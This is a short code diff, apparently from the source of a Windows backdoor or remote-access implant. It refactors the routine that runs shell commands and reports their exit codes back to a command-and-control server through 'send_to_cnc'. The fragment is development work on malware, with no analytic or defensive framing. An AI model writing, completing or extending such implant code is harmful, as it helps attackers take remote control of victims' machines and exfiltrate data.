@@ -69,11 +69,7 @@ void handle_shell()
         else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
         {
             send_to_cnc(&bytes_read, sizeof(bytes_read));
-            GetExitCodeProcess(cmd.proc_info.hProcess, &cmd.exit_code);
-            CloseHandle(cmd.proc_info.hProcess);
-            CloseHandle(cmd.proc_info.hThread);
-            log_info("\"%s\" exited with %d", cmd.cmd, cmd.exit_code);
-            free(cmd.cmd);
+            close_shell_process(&cmd);
             send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
             return;
         }
